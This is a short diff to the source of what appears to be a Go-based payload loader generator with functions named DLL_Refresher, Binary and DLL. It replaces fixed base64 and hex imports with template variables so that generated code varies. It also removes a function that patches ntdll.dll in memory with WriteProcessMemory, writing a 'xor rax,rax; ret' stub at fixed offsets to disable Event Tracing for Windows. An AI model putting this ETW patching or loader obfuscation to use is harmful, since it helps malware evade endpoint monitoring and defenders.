@@ -319,8 +319,8 @@ func DLL_Refresher() string {
 
 	import (
 		"debug/pe"
+		{{.Variables.B64}}
 		{{.Variables.HEX_Import}}
-		"encoding/base64"
 		"[loader]/[loader]"
 		"io/ioutil"
 		"strconv"
@@ -470,7 +470,7 @@ func Binary() string {
 
 	import (
 		"debug/pe"
-		"encoding/base64"
+		{{.Variables.B64}}
 		"time"
 		"[loader]/[loader]"
 		{{.Variables.HEX_Import}}
@@ -645,8 +645,8 @@ func DLL() string {
 	import "C"
 
 	import (
-		"encoding/base64"
-		"encoding/hex"
+		{{.Variables.B64}}
+		{{.Variables.HEX_Import}}
 		"[loader]/[loader]"
 		"strconv"
 		"syscall"
@@ -1542,18 +1542,4 @@ func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
 	`
 }
 
-func ETWInjectionSection() string {
-	return `
-	if {{.Variables.name}} == "C:\\Windows\\System32\\ntdll.dll" {
-		{{.Variables.offset}} := []uint32{0x4E1A0, 0x4E100, 0x41E70, 0x42030}
-		for i, _ := range {{.Variables.offset}} {
-			{{.Variables.data}}, _ := hex.DecodeString("4833C0C3")
-			var {{.Variables.nLength}} uintptr
-			{{.Variables.datalength}} := len({{.Variables.data}})
-			{{.Variables.WriteProcessMemory}}({{.Variables.handle}}, uintptr(uint({{.Variables.dllOffset}} ))+uintptr(uint({{.Variables.offset}}[i])), uintptr(unsafe.Pointer(&{{.Variables.data}}[0])), uintptr(uint32({{.Variables.datalength}} )), &{{.Variables.nLength}})
-		}
-	} else {
 
-	}
-`
-}
